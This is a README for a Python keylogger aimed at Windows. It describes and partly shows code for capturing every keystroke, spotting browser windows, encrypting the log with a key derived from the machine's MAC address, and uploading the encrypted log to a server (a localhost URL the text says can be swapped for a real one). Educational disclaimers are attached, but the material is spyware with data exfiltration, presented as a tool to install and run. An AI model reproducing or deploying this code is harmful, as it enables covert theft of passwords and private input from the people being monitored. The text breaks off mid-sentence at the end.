# Keylogger Python Script

This Python script demonstrates a keylogger that captures keystrokes on a Windows machine. The script uses the `pynput` library for listening to keyboard events and `cryptography` to encrypt the captured keystrokes. It is intended for educational purposes only and should not be used for illegal activities.

## Features:
- Captures all keypress events.
- Logs keystrokes to a file.
- Automatically flushes the buffer every 5 seconds or 100 characters.
- Encrypts the log file using `cryptography.fernet` encryption.
- Uploads the encrypted file to a server (optional).

## Prerequisites:
- Python 3.x
- Required libraries:
  - `cryptography`
  - `pynput`
  - `requests`
  - `pywin32` (for Windows API interaction)
  
You can install the required libraries using pip:

```bash
pip install cryptography pynput requests pywin32
```
## How it Works:
  - Key Generation: The script generates a unique key based on the machine's MAC address to encrypt and decrypt the log file.
  - Keylogger: Captures all keystrokes and identifies special keys like Enter, Space, and Backspace.
  - Browser Detection: Checks if the active window is a browser (Chrome, Firefox, Edge, Opera) to make browser-specific corrections in the logs.
  - Buffer Management: Keystrokes are stored in a buffer and flushed to a log file periodically or when the buffer reaches 100 characters.
  - Encryption: The log file is encrypted using the Fernet symmetric encryption method.
  - File Upload: Optionally, after encryption, the log file can be uploaded to a server.

## Code Walkthrough:

Key Generation
The machine key is generated using the MAC address, which is then base64-encoded for encryption purposes.

```bash
def generate_machine_key():
    mac_address = uuid.getnode()
    mac_str = str(mac_address).encode()
    padded = mac_str.ljust(32, b' ')
    return urlsafe_b64encode(padded)
```
## Keystroke Handling
- The handle_keypress function processes keypress events, distinguishing between regular keys and special keys (e.g., Enter, Backspace). The keystrokes are stored in a buffer.

## Encryption
- The captured keystrokes are written to a log file, which is later encrypted using the cryptography.fernet module.
```bash
def encrypt_file(filename, cipher):
    try:
        with open(filename, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(f"{filename}.encrypted", "wb") as f:
            f.write(encrypted)
        os.remove(filename)
        print(f"File encrypted: {filename}.encrypted")
    except Exception as e:
        print(f"Encryption error: {e}")
```
## Uploading the Encrypted File
After encryption, the log file can be uploaded to a server. In this case, it uses a mock URL (http://localhost:3000/upload), but this can be replaced with an actual upload server.

```bash 
def upload_file(filename):
    try:
        with open(filename, "rb") as f:
            requests.post("http://localhost:3000/upload", files={"file": f})
        print("Upload successful")
    except Exception as e:
        print(f"Upload failed: {e}")
```
## Running the Script
- To start the keylogger, simply run the script. It will start listening for keypress events, log them, and encrypt the log when you press the ESC key.

```bash
python keylogger.py
```
- Press ESC to stop the keylogger. After stopping, the log file is encrypted and can be uploaded if desired.

Disclaimer:
This script is for educational purposes only. Using this script for malicious purposes, such as capturing someone's keystrokes without their consent, is illegal and unethical. Ensure you have proper authorization before using this script.

## This repo also include the encryption and decryption tools that used . you can find documntion for those as following 






